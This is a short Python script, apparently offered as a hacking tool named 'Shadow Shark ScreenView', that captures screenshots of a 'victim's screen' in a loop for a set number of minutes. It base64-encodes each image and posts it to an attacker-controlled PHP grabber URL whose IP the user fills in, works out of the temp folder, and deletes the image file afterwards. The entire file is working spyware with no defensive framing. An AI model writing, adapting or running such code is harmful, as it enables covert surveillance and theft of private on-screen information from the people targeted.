# -*- coding: utf-8 -*-
"""
The Shadow Shark ScreenView library.

@author: Mr. Shark Spam Bot
"""
import argparse
import time
import urllib.request
import codecs
import pathlib
import os
from PIL import ImageGrab

def get_arguments():
    '''Get the time.'''
    parser = argparse.ArgumentParser(description='''The Shadow Shark ScreenView library.''')
    parser.add_argument('-t', '--time', dest='time', required=True, type=int,
                        help="The amount of time to view the victim's screen in minutes.")
    options = parser.parse_args()
    return options.time

def main():
    '''Get screenshots and send to website.'''
    screenshot = ImageGrab.grab()
    screenshot.save('screenshot.png', 'png')
    with open('screenshot.png', 'rb') as screenshot:
        screenshot = screenshot.read()
        screenshot = codecs.encode(screenshot, encoding='base64')
    urllib.request.urlopen(PHP_URL, data=b'data:image/png;base64,' + screenshot)

if __name__ == '__main__':
    home = pathlib.Path().home()
    temp = home / 'AppData\Local\Temp'
    if os.path.exists(temp):
        os.chdir(temp)
    elif os.path.exists('/tmp'):
        os.chdir('/tmp')

    PHP_URL = 'http://IP/ScreenView/grabber.php' # Set IP on this line.
    minutes = get_arguments() * 60
    end_time = time.time() + minutes

    try:
        print('[+] Running ScreenView.')
        while time.time() < end_time:
            main()
    except:
        print('[-] ScreenView Crashed.')
    finally:
        os.remove('screenshot.png')
